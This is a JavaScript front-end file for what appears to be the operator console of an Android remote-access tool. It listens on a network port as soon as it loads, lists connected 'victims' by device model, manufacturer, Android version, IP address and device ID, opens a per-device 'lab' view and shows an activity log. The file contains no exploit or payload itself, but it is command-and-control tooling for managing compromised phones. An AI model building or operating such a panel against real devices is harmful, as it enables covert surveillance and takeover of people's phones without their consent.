"use strict";
const api = window.api;
const $ = (id) => document.getElementById(id);

let listening = false;
const victims = new Map();

function esc(s) {
  return String(s == null ? "" : s).replace(/[&<>"']/g,
    (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
}

// ---- listen control ----------------------------------------------------
$("listen").onclick = () => {
  const port = parseInt($("port").value, 10) || 42474;
  api.listen(port);
};

api.onListenState((s) => {
  listening = !!s.listening;
  $("dot").className = "dot" + (listening ? " on" : s.error ? " err" : "");
  $("sttext").textContent = listening
    ? `listening on ${s.port}` : s.error ? `error: ${s.error}` : "not listening";
  $("listen").textContent = listening ? "Restart" : "Listen";
  $("listen").disabled = listening;
});

// ---- victims ------------------------------------------------------------
api.onVictims((list) => {
  victims.clear();
  for (const v of list) victims.set(v.sid, v);
  renderVics();
});

function renderVics() {
  const box = $("vics");
  if (victims.size === 0) {
    box.innerHTML = "<p class='empty'>no devices connected yet</p>";
    return;
  }
  box.innerHTML = "";
  for (const v of victims.values()) {
    const el = document.createElement("div");
    el.className = "vic";
    el.innerHTML = `
      <div class="top">
        <span class="model">${esc(v.model || "Android device")}</span>
        <button data-id="${esc(v.sid)}">Open lab</button>
      </div>
      <div class="meta">${esc(v.manf || "")} &middot; Android ${esc(v.release || "?")} &middot; ip ${esc(v.ip || "?")}</div>
      <div class="act">device_id ${esc(v.id || "?")} &middot; ${esc(v.sid.slice(0, 8))}</div>`;
    el.querySelector("button").onclick = () => api.openLab(v.sid);
    box.appendChild(el);
  }
}

// ---- log ----------------------------------------------------------------
const log = $("log");
let logCount = 0;
api.onLog((line) => {
  const div = document.createElement("div");
  const s = String(line);
  div.className = /error|fail|reject|unknown|! /.test(s) ? "err"
    : /->|started|saved|connected/.test(s) ? "out"
    : /^</.test(s) ? "in" : "dim";
  div.textContent = s;
  log.appendChild(div);
  while (log.childNodes.length > 800) log.removeChild(log.firstChild);
  log.scrollTop = log.scrollHeight;
  $("logcount").textContent = ++logCount;
});

// start listening immediately so the panel works out of the box
api.listen(parseInt($("port").value, 10) || 42474);
